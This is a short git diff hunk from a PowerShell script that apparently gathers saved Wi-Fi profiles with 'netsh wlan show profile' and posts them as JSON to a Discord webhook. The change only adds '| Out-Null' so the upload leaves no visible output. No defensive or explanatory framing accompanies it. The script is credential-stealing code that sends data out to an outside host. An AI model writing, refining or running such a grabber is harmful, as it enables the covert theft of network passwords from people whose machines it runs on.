@@ -39,7 +39,7 @@ netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
 $JsonBody = ($Body | ConvertTo-Json -Compress)
 # Remove the comments if you want debug it
 #    try {
-    Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body $JsonBody
+    Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body $JsonBody | Out-Null
  #   } catch {
   #      Write-Host "Some err: $_"
    # }
